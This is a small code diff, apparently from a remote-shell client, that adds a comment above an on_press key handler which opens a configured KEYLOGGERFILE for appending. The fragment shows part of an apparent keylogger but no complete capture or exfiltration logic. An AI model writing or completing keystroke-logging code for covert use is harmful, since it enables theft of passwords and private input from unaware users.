@@ -41,6 +41,7 @@ class rs_client:
 
             time.sleep(3)
 
+    # Handles the key registering.
     def on_press(self, key):
         f = open(App.config('KEYLOGGERFILE'), 'a')  
 
